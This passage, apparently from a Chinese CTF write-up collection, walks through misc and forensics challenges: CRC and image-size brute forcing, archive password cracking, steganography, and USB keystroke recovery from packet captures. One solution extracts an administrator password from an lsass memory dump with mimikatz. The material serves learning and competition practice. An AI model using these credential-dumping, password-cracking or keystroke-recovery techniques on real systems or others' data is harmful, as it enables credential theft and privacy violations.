#爆破用的字符集

def CRCZipFile(zipPath):
    return zipfile.ZipFile(zipPath).getinfo("data.txt").CRC #获取压缩包内文件的CRC值

#爆破CRC获取数据
def CrackData(sampleCRC):
    for i in base64StrDictionary:
        for j in base64StrDictionary:
            for k in base64StrDictionary:
                for h in base64StrDictionary:
                    data = i + j + k + h
                    if sampleCRC == (binascii.crc32(data.encode())):
                        return data
def CrackZip():
    data = ""
    #循环获取每一个压缩包内的内容
    for i in range(68):
        fileName = "b2ca8799-13d7-45df-a707-94373bf2800c\\out{}.zip".format(i)
        data += CrackData(CRCZipFile(fileName))
        print(data)
    print(data)

CrackZip()
```

得到了一串 base64 字符串。

```text
z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==
```

将其解码后得到一个文件，根据文件尾 `C4 3D 7B 00 40 07 00` 可知是 Rar 文件，补全修正文件头。打开文件即可在文件备注处看到 flag。

```flag
flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}
```

### [MRCTF2020]ezmisc（png其他没招之后，爆破宽高（修复宽高））

010 editor 打开文件发现提示 CRC Mismatch。

![image-20231201214844539](assets/image-20231201214844539.png)

于是打开脚本爆破图片宽高（或者修复宽高），得到 `hex: 0x1f4 0x1c8`，对应修正之后打开图片可得 flag。

如何爆破呢？先打开图片，找到图片的CRC值，然后，填写到宽高爆破脚本中

![image-20231201220644840](assets/image-20231201220644840.png)

```python
import binascii
import struct
crcbp = open("flag.png", "rb").read()
for i in range(2000):
    for j in range(2000):
        data = crcbp[12:16] + struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if(crc32 == 0x370c8f0b):#根据图片的CRC32值来修改
            print(i, j)
            print('hex:', hex(i), hex(j))
```

爆破出来之后，去修改宽高：

![image-20231201221915669](assets/image-20231201221915669.png)

```flag
MRCTF{1ts_vEryyyyyy_ez!}
```

### [HBNIS2018]低个头（低头看键盘，键盘密码）

这波就蛮神奇的，根据给出密文 `EWAZX RTY TGB IJN IO KL` 用手指划键盘可得出 `CTF` 三个字符。

```flag
flag{CTF}
```

### [GXYCTF2019]SXMgdGhpcyBiYXNlPw==

题目 base 解码之后得到 `Is this base?` 的信息。感觉在暗示 base64 隐写，拿出脚本跑一下得到 flag。

```flag
GXY{fazhazhenhaoting}
```

### [ACTF新生赛2020]NTFS数据流(工具或命令解)

用winrar逐级解压，

#### 1）工具解

再使用 NTFSStreamEditor2 扫描，得出 flag 文件。

![image-20231202095535637](assets/image-20231202095535637.png)

#### 2）命令解

在解压出来的文件目录，使用dir /r | findstr "$DATA" 命令寻找NTFS流可疑数据，之后打开即可

![image-20231202100306534](assets/image-20231202100306534.png)

```flag
ACTF{AAAds_nntfs_ffunn?}
```

### [RoarCTF2019]黄金6年（看视频，找解压密码）

010 editor 打开视频文件，在文件最后可以找到一串 base64 字符。

```text
UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD
Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf
JkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA==
```

将其解码后，发现是个RAR压缩包，于是直接丢到工具箱，转码成16进制，再用010editor导入16进制，另存为fuck.rar，解码。保存发现是个需要密码的压缩文档。回到文档中找提示，发现了二维码。

![image-20231202144910305](assets/image-20231202144910305.png)

稍带处理后扫描得出 `i` `play` `ctf` 的字样，拼接发现不对，但是实在找不到了，上网看了一波 WriteUp 发现还有个 `want`，于是成功解压，得到了 flag。

```flag
roarctf{CTF-from-RuMen-to-RuYuan}
```

### 间谍启示录(ISO镜像磁盘挂载)

挂载磁盘到本地，发现一个 exe，根据暗示运行一次 exe，发现是自解压，同时生成了一些文件，其中的某一些被解压后脚本删除了。于是不用自解压，直接 7-zip(或者winrar打开，复制里面的文件提取出来) 打开，发现有个 flag.exe。

听说还可以直接formost分离文件

![image-20231202144004559](assets/image-20231202144004559.png)

解压出来运行之后即会生成 flag。

```flag
Flag{379:7b758:g7dfe7f19:9464f:4g9231}
```

### 我吃三明治(base32解码，jpg图片拼接之间藏信息)

用 010 editor 打开解压的图片，发现在文件尾部有一串字符串，后面接着另一张图片。图片提取出来之后是一张朴实的三明治图片。字符串用 base32 解码之后即为 flag。

![image-20231202090246741](assets/image-20231202090246741.png)

```flag
flag{6f1797d4080b29b64da5897780463e30}
```

### [SUCTF2018]single dog

010 editor 打开文件可以发现很多文件，foremost 分离一下得到一个压缩包。压缩包中有一个文本文档，其中是 aaencode 的代码。

![img](assets/c1879834cef0528f99c210a300a7672f.png)

将代码复制到工具中解密可得如下内容。

```javascript
function a()
{
var a="SUCTF{happy double eleven}";
alert("双十一快乐");
}
a();
SUCTF{happy double eleven}
```

### [V&N2020 公开赛]拉胯的三条命令

找开放的端口，换种思路也就是找有响应且建立连接的端口。打开 Wiresahrk 分析流量包，筛选 `tcp.flags == 0x010 || tcp.flags == 0x02` 找到全部 TCP 建立连接与相应的数据包，找到二者交替出现的端口，即为开放的端口。筛选之后找出以下端口。

```text
21
22
631
801
3306
```

根据提示可知 flag。

```flag
flag{21226318013306}
```

### [安洵杯 2019]吹着贝斯扫二维码（pdf拼图）

附件是加密的flag.zip和其他36个文件。36个文件都是jpg图片，且能拼图成一个二维码(010editor打开，末尾有异常数字，是拼图的序号)。

需要给这些文件添加拓展名，直接使用cmd下的ren命令批量重命名，添加.jpg拓展名。当然，这里可以用Python写脚本，但个人认为这里用cmd命令更方便快捷。

```cmd
命令：ren * *.jpg
//这条命令会把此目录下所有文件重命名，所以使用的时候注意目录位置
//还有注意这里的flag.zip文件也被重命名，改回.zip后缀就行
```

之后，使用wps新建一个空白pdf,然后将图片按顺序拖进来，拼图，就能得到二维码

![image-20231202163500467](assets/image-20231202163500467.png)



扫描得到BASE Family Bucket ??? 85->64->85->13->16->32。

flag.zip的备注是：GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY

随波逐流可以先base32解码，再base16解码，看来要把上面的过程反向做一遍。32->16->13->85->64->85解码，其中13指的是rot13，最终得到解压密码ThisIsSecret!233。

解压缩得到flag.txt内容是 flag{Qr_Is_MeAn1nGfuL}

![image-20231202162825845](assets/image-20231202162825845.png)

扫描二维码得到信息 `BASE Family Bucket ??? 85->64->85->13->16->32`。将压缩包备注取出，按照如上步骤倒序操作，得到了 `ThisIsSecret!233`。将其作为压缩包密码解压即可得到 flag。

```flag
flag{Qr_Is_MeAn1nGfuL}
```

### 从娃娃抓起（中文电码，五笔编码）

根据提示可知，给出的密文为两种汉字编码，四位数字描绘一个汉字的大概就是标准中文电码。对应解密之后为如下内容。

![image-20231202172839886](assets/image-20231202172839886.png)

剩下的英文字符描绘汉字的编码联系到各种输入法，容易猜想到是五笔输入法，将其转换后得到 `也要从娃娃抓起`。再根据提示将上述内容拼接后转为 MD5，得到 flag。

```flag
flag{3b4b5dccd2c008fe7e2664bd1bc19292}
```

### 小易的U盘(exe，除了IDA反编译，还可以直接改后缀txt,然后搜索关键字)

第 32 个副本 exe 放到 IDA 里看字符串可以直接看到 flag。

![img](assets/61c4c6f6b73c69730265899d0ff3d302.png)

```flag
flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}
```

### [ACTF新生赛2020]swp(流量分析，zip伪加密)

附件wget.pcapng，协议里只有GET方法的HTTP流。虽然传输有大量图片，但是图片都没用。最后两次HTTP的GET内容有用，一个secret.zip（有密码），另一个是提示。hint.html页面上写着“

```
<h1>you don't need password</h1>
```

”。那就是伪加密，修改后加密标志位可以解压缩。

    (http.request.method==GET && (http.request.uri contains "zip" || http.request.uri contains "hint")) || http.response.code==200

修正压缩包伪加密（用ZipCenOp.jar），解压之后用 010 editor 打开 .swp 文件，可以直接找到 flag。

![image-20231202105358794](assets/image-20231202105358794.png)

```flag
actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}
```

### 百里挑一（exiftool工具浏览整个文件夹内内容）

Wireshark 打开数据包，发现很多图片流量，使用文件>导出对象将整个 HTTP 对象导出，太多图片了，拿到kali里面，用exiftool整体浏览搜索一下关键字flag

```
exiftool ./outfile|grep flag
找到一半flag
```

![image-20231202205518189](assets/image-20231202205518189.png)

根据文件名再去追踪对应的 TCP 流，猜测剩下的部分也存在 Exif 中，搜索exif关键字，跟踪到 TCP 流 114，可以在 Exif 中找到剩下半个 flag。

![image-20231202210640083](assets/image-20231202210640083.png)

```flag
flag{ae58d0408e26e8f26a3c0589d23edeec}
```

### [WUSTCTF2020]alison_likes_jojo（jpg图片-outguess隐写）

010 打开 boki.jpg，发现其尾部有压缩文档。

![image-20231202154728756](assets/image-20231202154728756.png)

`binwalk -e` 分离出来，使用 ARCHPR 爆破得到密码 888866。

![image-20231202154719103](assets/image-20231202154719103.png)

解压后得到一个文本文档，内容是 `WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09`。三重 base64 解密之后得到 `killerqueen`。

直接把它作为 flag 发现并不正确，于是猜测为 key，尝试对 jljy.jpg 进行 outguess，得到 flag。

![image-20231202154703965](assets/image-20231202154703965.png)

```flag
wctf2020{pretty_girl_alison_likes_jojo}
```

### [GUET-CTF2019]zips（花式爆破）

首先使用 ARCHPR 爆破 222.zip，得到密码 723456。

![image-20231202173035305](assets/image-20231202173035305.png)

解压之后得到 111.zip，修正伪加密之后解压出 flag.zip 和 start.sh，根据脚本内的内容可知 flag.zip 的密码为出题时的时间。结合 111.zip 和 flag 的修改时间确定范围，使用 ARCHPR 爆破出密码。

```sh
#!/bin/bash
#
zip -e --password=`python -c "print(__import__('time').time())"` flag.zip flag
```

![image-20231202173138518](assets/image-20231202173138518.png)

解压 flag.zip 就可以得到 flag。

```flag
flag{fkjabPqnLawhvuikfhgzyffj}
```

### [安洵杯 2019]Attack(流量分析，文件分离，mimikatz提取lsass.dmp的信息)

Wireshark 分析数据包，从数据流中分理出包含 flag 的压缩文档。

![image-20231202212316365](assets/image-20231202212316365.png)

根据压缩包文档备注，得知需要找到 administrator 的密码，但没思路了，于是回头去找流量包，

![image-20231202212627107](assets/image-20231202212627107.png)

从数据包中导出 lsass.dmp，使用 mimikatz 提取出密码。

![img](assets/58c0915e8632b18b13a681f109805600.png)

使用提取出的密码 `W3lc0meToD0g3` 解压压缩包即得到 flag 文件，在文件底部发现flag。

```flag
D0g3{3466b11de8894198af3636c5bd1efce2}
```

### 二维码（拼图）

简单得拼一下，然后用微信扫即可得 flag。

![img](assets/0081d068469d59c22237ce36946358be.png)

```flag
flag{7bf116c8ec2545708781fd4a0dda44e5}
```

### [WUSTCTF2020]爬（pdf隐写-图片遮盖）

010 editor 打开文件后确定为 pdf 文件，修正拓展名。使用 wps 打开 pdf 文件，根据提示将图片移开，得到如下图片。

![image-20231202153810757](assets/image-20231202153810757.png)

```text
0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d
```

将上述图片中的文字提取出来，利用十六进制转 ASCII 可得 flag。

```flag
wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}
```

### [WUSTCTF2020]girlfriend(dtmf，手机键盘密码)

解压得到一段音频，听了一段之后分辨出是 DTMF。尝试使用[在线解密工具](http://dialabc.com/sound/detect/index.html)解密。

![image-20231202174819197](assets/image-20231202174819197.png)

得到如下内容。

```text
999*666*88*2*777*33*6*99*4*444*777*555*333*777*444*33*66*3*7777
```

然后对应手机九键进行解密，可得如下内容。

```text
YOUAREMXGIRLFRIENES
```

对内容进行修正并猜测，就可以得出 `youaremygirlfriends`。

```flag
flag{youaremygirlfriends}
```

### [MRCTF2020]CyberPunk（修改系统时间）

暴力解：直接改打开010editor，打开文件xxx.exe，搜索关键字，ctf

![image-20231202211413772](assets/image-20231202211413772.png)

运行程序之后提示检测时间，于是把系统时间更改到一致即可得到 flag。

![image-20231202211131994](assets/image-20231202211131994.png)

```flag
MRCTF{We1cOm3_70_cyber_security}
```

### USB(UsbKeyboardDataHacker处理usb数据包，维吉尼亚密码，栅栏密码)

binwalk 发现解压出来的文件中有几个压缩文档，`binwalk -e` 提取出来。

![image-20231202220210974](assets/image-20231202220210974.png)

用foremost提取一波得到一个`key.pcap`流量包，

![image-20231202220449261](assets/image-20231202220449261.png)

发现是USB数据包，使用 UsbKeyboardDataHacker 来进行分析，得到如下字符串,包含一个key{xinan}。

![image-20231202223640485](assets/image-20231202223640485.png)

```text
aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey{xinan}
```

由 RAR 文件结构可知其 HeadType 应为 `0x74`，将其修正之后解压压缩文档，得到一张图片。

![image-20231202223728916](assets/image-20231202223728916.png)

StegSolve 可解出一张二维码，扫描可得如下内容。

```text
ci{v3erf_0tygidv2_fc0}
```

以 `xinan` 为密码，使用 Vigenère Decode 对上述内容操作，再用以 2 为密钥的栅栏密码解密即可得到 flag。

![image-20231202223709663](assets/image-20231202223709663.png)

```flag
flag{vig3ne2e_is_c00l}
```

### 键盘侠(USB流量)

首先过滤指定USB流量另存为单独流量包usb.pcapng

![image-20231212195755503](assets/image-20231212195755503.png)

使用tshark命令提取USB指定的4个字节

```
tshark.exe -r usb.pcapng -T fields -e usb.capdata > usbdata.txt
```

得到的数据如下，中间没有冒号，需要使用脚本转换一下

![image-20231212195713256](assets/image-20231212195713256.png)

```python
with open('usbdata.txt', 'r') as file:
    lines = file.readlines()

with open('newusbdata.txt', 'w') as file:
    for line in lines:
        line = line.strip()
        grouped_line = ':'.join([line[i:i + 2] for i in range(0, len(line), 2)])
        file.write(grouped_line + '\n')
```

编写python脚本将提取出来的所有usbhid.data转化为敲击内容

```python
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('newusbdata.txt')
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        del output[a-1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass
print ('output :' + "".join(output))
```

得到flag



### [MRCTF2020]不眠之夜(拼图题目)

注意:解题时，可能有损坏的图片，干扰合成，要先删掉

下载附件，删去不必要的文件，查看文件夹属性，一共120张图片
 ![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70-170176569568039.png)
 再查看图片属性，分辨率为200x100
 ![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70-170176569568040.png)

1.使用 `montage` 命令将碎片合成为一张图片,得到flag.jpg

```bash
法一：
montage  -tile 10x12 -geometry 200x100+0+0 *jpg flag.jpg
#把图片碎片合成一个图片
#-geometry +0+0的用处是让图片之间没有间隙
#*.jpg指目标为目录下所有的jpg格式图片
- `-geometry`: 指定拼接图像的几何布局，包括图像大小、边距等。例如，`-geometry 400x200+0+0` 表示每个图像的大小为 400x200 像素，排列方式为从左上角开始。
- `-tile`: 指定拼接图像的排列方式。例如，`-tile 3x3` 表示按 3x3 的网格排列。
- `-title`: 设置拼接图像的标题。
- `-pointsize`: 指定文本的大小。
- `-font`: 指定文本的字体。

gaps run flag.jpg fuck.jpg --generations=40 --population=120 --size=100
#population为图片数量，size为每个图片高度




法二：
montage *.jpg -tile 10x12 -resize 4000x2400 -geometry +0+0 out.jpg 
*.jpg指目标为目录下所有的jpg格式图片
population为图片数量，size为每个图片高度

resize后是最终合成图片的长x宽
tile后是从左往右张数x从上往下张数
当*.jpg在resize前面传入后，它接下来读到行和列对应的图片数就可以进行转换。至于重新设大小之类的等转完再说。

当*.jpg在resize后传入时，它会对指定的图片进行重新设定大小后再拼接。
*.jpg的.可以省略，没有影响
```

![image-20231205184358506](assets/image-20231205184358506.png)

![image-20231205190407031](assets/image-20231205190407031.png)

### [SWPU2019]Network(TTL)

```
    IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。
    TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，
    远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。
    如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。
```

根据上述规则，可以知道TTL隐写中用到四个值：`00 111111`（63）,`01 111111`（127）,`10 111111`（191）,`11 111111`（255）,解密的时候只取前两位，然后转换成ascii
 简化一下，可以这么认为：用

```
00 替换 63
01 替换 127
10 替换 191
11 替换 255
```

于是可以写脚本：

```python
import binascii
f=open("attachment.txt","r")
f2=open("result.txt","wb")
num=''
res=''
for i in f:
    if int(i)==63:
        num+="00"
    if int(i)==127:
        num+="01"
    if int(i)==191:
        num+="10"
    if int(i)==255:
        num+="11"
for j in range(0,len(num),8):
    res += chr(int(num[j:j+8],2))#转换为字符
res = binascii.unhexlify(res)#unhexlify:从十六进制字符串返回二进制数据
f2.write(res)
```

TTL 的题目，把网上的脚本稍微改一点，可以提取出一个压缩文档。

```python
import binascii

with open('ttl.txt') as f:
    lines = f.readlines()
n_num = []

for i in lines:
    if i != '\n':
        n_num.append(int(i))

rlt = ''
for i in range(0, len(lines)):
    tmp = bin(n_num[i])[2:]
    tmp = '0' * (8 - len(tmp)) + tmp
    rlt += tmp[0:2]

rlt2 = ''
for i in range(0, len(rlt), 8):
    rlt2 += chr(int(rlt[i:i + 8], 2))
with open('fi.txt', 'w') as f:
    f.write(rlt2.rstrip())

hexData = open('fi.txt').read()
file = open('fi.zip', 'wb')
file.write(binascii.unhexlify(hexData))
file.close()
```

修正所得压缩包的伪加密，得到一个文本文档。对其循环 base64 解码即可得到 flag。

```flag
flag{189ff9e5b743ae95f940a6ccc6dbd9ab}
```

### [SUCTF2018]followme

Wireshark 分析流量包，跟到一个 POST 请求处可以看到 flag。

或者，分析个屁！直接010editor打开，搜索关键词CTF

![image-20231202211806105](assets/image-20231202211806105.png)

```flag
SUCTF{password_is_not_weak}
```

### [RCTF2019]draw

很像 PC Logo 的代码，初中的时候玩过一些。可惜的是 PC Logo 不兼容 x64 的系统了，只能找了个在线的[解释器](https://www.calormen.com/jslogo/)。将代码粘贴进去执行可以得到一幅图，同时也是 flag。

![img](assets/7c61e539f61eb253454cc8b4570a9198.png)

```flag
flag{RCTF_HeyLogo}
```

### [XMAN2018排位赛]通行证

先对附件给出的字符串解 base64，再以 7 为 key 做 Rail Fence Cipher Encode，再 ROT13 一次，就可以得到 flag。

![img](assets/f0e968eb318c6727926d581d249b26db.png)

```flag
xman{oyay_now_you_get_it}
```

### 千层套路(压缩包千层饼)

拿到题目压缩包，有密码，压缩包名字为四位数字，猜测为解压密码，尝试解压成功。内部依次递进，解压了几重之后，结合题目名字，看来要上脚本，逐级解压

```python
# fuck_zip.py
import zipfile
import os

path = r"D:\.......\0573"  # 这个自己把控想在哪里开始使用脚本
file = "0114.zip"


def un_zip(Path, File_name):  # 传入一个路径和当前路径的压缩包名字，返回解压缩后的文件名字
    current_file = Path + os.sep + File_name  # 路径+'/'+文件名
    # new_path=''
    os.chdir(Path)  # 改变当前工作路径，方便添加文件夹

    zip_file = zipfile.ZipFile(current_file)
    # print(zip_file.namelist()[0])
    new_file = zip_file.namelist()[0]  # 新解压的压缩文件为新的路径名字

    # new_path=current_path + os.sep + new_file
    # os.mkdir(new_path) #新建一个以解压出来的压缩包为名字的文件夹

    # os.chdir(new_path)
    zip_file.extractall(path=Path, members=zip_file.namelist(), pwd=File_name[0:-4].encode())  # 因为密码就是文件名
    zip_file.close()

    return new_file


new = file
new1 = ''
while (1):
    # new1=un_zip(path,new) #第一次解压出来了new1
    if (new == ''):  # 判断是否解压完毕，是则直接退出
        print("end:" + new1)
        break

    else:  # 否则就开始新的解压
        new1 = un_zip(path, new)
        print("continue:" + new1)
        new = new1
```

然后在1001的文件夹里面发现了qr.txt

![image-20231202184321401](assets/image-20231202184321401.png)

根据文件名和文件内容，是一个二维码啊，那我们再写个脚本画一下二维码。

```python
from PIL import Image
from zlib import *

file=open('CTFtools\misc\qr.txt','r').read().split('\n')
#print(file)
i=0
pic=Image.new("RGB",(200,200))
for y in range(200):
    for x in range(200):
        if file[i]=='(0, 0, 0)':
            color=(0,0,0)
            pic.putpixel([x,y],color)
        else:
            color=(255,255,255)
            pic.putpixel([x,y],color)
        i=i+1
pic.show()
```

![image-20231202185302842](assets/image-20231202185302842.png)

### [安洵杯 2019]easy misc（盲水印，BlindWaterMark,词频分析）

foremost分离+掩码+盲水印+词频统计

题给了三个文件

[![img](assets/2627265-20220628195028172-1865981360.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195028172-1865981360.png)

read文件夹

[![img](assets/2627265-20220628195203387-1161024869.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195203387-1161024869.png)

全是txt文件，里面是英文文章

[![img](assets/2627265-20220628195242746-2014840480.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195242746-2014840480.png)

文件夹末尾有一个hint

[![img](assets/2627265-20220628195328885-15957387.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195328885-15957387.png)

应该是词频统计，取出现频率最高的前十六个字符

可不知道看哪一个txt文件

再看压缩包，加密，但注释有提示

[![img](assets/2627265-20220628195508144-1236603483.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195508144-1236603483.png)

前面的算式解出来是7

七个数字+字符串掩码

[![img](assets/2627265-20220628195611554-964960780.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195611554-964960780.png)

得到密码2019456NNULLULL,

一张替换表

[![img](assets/2627265-20220628195707462-466891534.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195707462-466891534.png)

最后是那张png

foremost分离出两张一样的png，盲水印

[![img](assets/2627265-20220628195127844-331055344.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628195127844-331055344.png)

盲水印github地址[GitHub - chishaxie/BlindWaterMark: 盲水印 by python](https://github.com/chishaxie/BlindWaterMark)

有py2和py3两种

我用的python3的那个脚本

[![img](assets/2627265-20220628200247657-88778264.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628200247657-88778264.png)



```
python bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png
```

命令中原图放后面有水印的图放前面，不过顺序对得到的图片影响不大，只是颜色亮暗一点，可以都试一下

需要安装库

```
pip install opencv-python
pip install matplotlib==2.1.1
```

假如如下报错

[![img](assets/2627265-20220628200807132-1813054598.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628200807132-1813054598.png)

在图示代码间加入import sys(就是选中的那行

[![img](assets/2627265-20220628200939112-1573334777.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628200939112-1573334777.png)

成功导出

[![img](assets/2627265-20220628201049931-858563021.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201049931-858563021.png)

然后图片长这样

[![img](assets/2627265-20220628201137834-847062471.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201137834-847062471.png)

交换一下两张图片顺序

[![img](assets/2627265-20220628201204152-989935085.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201204152-989935085.png)

然后尝试在命令后面加--oldseed

[![img](assets/2627265-20220628201300955-768022552.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201300955-768022552.png)

有了，选11.txt

[![img](assets/2627265-20220628201329451-77201866.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201329451-77201866.png)

词频统计

```python
import re

file = open('D:/edge/read/11.txt')    
line = file.readlines()
file.seek(0,0)
file.close()

result = {}
for i in range(97,123):
    count = 0
    for j in line:
        find_line = re.findall(chr(i),j)
        count += len(find_line)
    result[chr(i)] = count
res = sorted(result.items(),key=lambda item:item[1],reverse=True)

num = 1
for x in res:
        print('频数第{0}: '.format(num),x)
        num += 1
```

[![img](assets/2627265-20220628201754551-575849161.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628201754551-575849161.png)

替换

```
etaonrhisdluygw
-->QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw=
```

base64（网上有说少个等号，不过用CyberChef的话好像没关系[CyberChef (chinabaiker.com)](https://www.chinabaiker.com/cyberchef.htm)

[![img](assets/2627265-20220628202152827-1666297572.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628202152827-1666297572.png)

base85[CTF在线工具-在线base85编码|在线base85解码|base85编码|base85解码 (hiencode.com)](http://www.hiencode.com/base85.html)

[![img](assets/2627265-20220628202216201-384081867.png)](https://img2022.cnblogs.com/blog/2627265/202206/2627265-20220628202216201-384081867.png)

flag{have_a_good_day1}

### [MRCTF2020]Unravel!!(AES解密，silenteye处理wav音频文件)

在解压出的音频尾部可以找到一串 AES 密文。

```text
U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=
```

binwalk 可知 JM.png 中包含多个图片，`binwalk -e` 分离可以得到一个图片。tokyo

![img](assets/38e3829ccb00a472a0c8dceb0ff64877.png)

将其作为 AES 的 key 可以解出明文 `CCGandGulu`。将解出的明文作为压缩包密码解压 win-win.zip 可以得到一个音频文件。SilentEye 可解出 flag。

![image-20231204162520823](assets/image-20231204162520823.png)

```flag
MRCTF{Th1s_is_the_3nd1n9}
```

### [GKCTF2020]code obfuscation

将图片修复好，扫描后得到信息 `base(gkctf)`。

![img](assets/c785f5e86082fca3bb03ec5080f59258.png)

binwalk 可知图片中包含一个压缩文件，`binwalk -e` 分离。根据上一步的信息，尝试后可知压缩包密码为 `base58(gkctf)`，即 `CfjxaPF`。

### [UTCTF2020]docx(binwalk文件分析，docx文档解压)

将 docx 文件解压后在 media 文件夹内可找到 flag 图片。

![img](assets/8e17f8d7d8d7448f340da83cfd32fcaa.png)

```flag
utflag{unz1p_3v3ryth1ng}
```

### [GKCTF2020]Harley Quinn

附件压缩包的备注里有需要用到的工具提示。下载 FreeFileCamouflage，发现是图片提取软件。图片的属性中有 #password# 字样，听到最后发现有 DTMF，上传到工具识别。

![img](assets/179348e2546dd1f3ade84a1b4a7e7b6c.png)

